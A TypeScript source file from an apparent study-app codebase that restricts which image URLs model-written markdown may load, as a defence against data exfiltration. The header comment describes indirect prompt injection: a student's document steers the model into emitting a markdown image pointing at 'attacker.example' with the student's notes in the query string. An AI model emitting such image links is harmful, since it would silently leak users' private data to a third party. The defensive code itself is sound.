/**
 * Which image URLs rendered markdown may fetch.
 *
 * Every markdown surface (MarkdownChat: the tutor, quiz Ask panel, flashcards,
 * library concept descriptions; the study guide reader draws no images at
 * all) renders text a model wrote after reading the student's documents and
 * conversation. A document can steer that text, and an image is fetched the
 * moment it is drawn, so `![](https://attacker.example/?q=<the student's
 * notes>)` would hand whatever the model was induced to write to a third
 * party with no click. Only images the app itself serves are drawn: same
 * origin, inline `data:image/*`, and the public buckets of the app's own
 * Supabase project. Anything else is shown as a link the student can choose
 * to follow. The CSP's img-src (lib/securityHeaders.ts) is the backstop.
 */

const DATA_IMAGE = /^data:image\/(?:png|jpe?g|gif|webp|avif|svg\+xml)[;,]/i;

export interface ImageSrcContext {
  /** The page origin, e.g. `https://saplinglearn.com`. */
  origin: string;
  /** The build's NEXT_PUBLIC_SUPABASE_URL; empty when the build has none. */
  supabaseUrl?: string;
}

/** The public-object prefix of the app's Supabase storage, or null. */
export function supabasePublicStoragePrefix(supabaseUrl: string | undefined): string | null {
  const raw = (supabaseUrl ?? "").trim();
  if (!raw) return null;
  try {
    const u = new URL(raw);
    if (u.protocol !== "https:" && u.protocol !== "http:") return null;
    return `${u.origin}/storage/v1/object/public/`;
  } catch {
    return null;
  }
}

/** True when markdown may draw `src` as an <img>. */
export function isAllowedMarkdownImageSrc(src: string | undefined | null, ctx: ImageSrcContext): boolean {
  const raw = (src ?? "").trim();
  if (!raw) return false;
  if (DATA_IMAGE.test(raw)) return true;
  let u: URL;
  try {
    u = new URL(raw, ctx.origin);
  } catch {
    return false;
  }
  if (u.protocol !== "https:" && u.protocol !== "http:") return false;
  if (u.origin === new URL(ctx.origin).origin) return true;
  const storage = supabasePublicStoragePrefix(ctx.supabaseUrl);
  return storage !== null && u.href.startsWith(storage);
}

/** The context in the browser: this page's origin and the build's Supabase URL. */
export function browserImageSrcContext(): ImageSrcContext {
  const origin = typeof window !== "undefined" ? window.location.origin : "http://localhost";
  return { origin, supabaseUrl: process.env.NEXT_PUBLIC_SUPABASE_URL };
}

/** An http(s) URL a blocked image may be offered as a link to, or null. */
export function imageLinkHref(src: string | undefined | null): string | null {
  const raw = (src ?? "").trim();
  try {
    const u = new URL(raw);
    return u.protocol === "https:" || u.protocol === "http:" ? u.href : null;
  } catch {
    return null;
  }
}
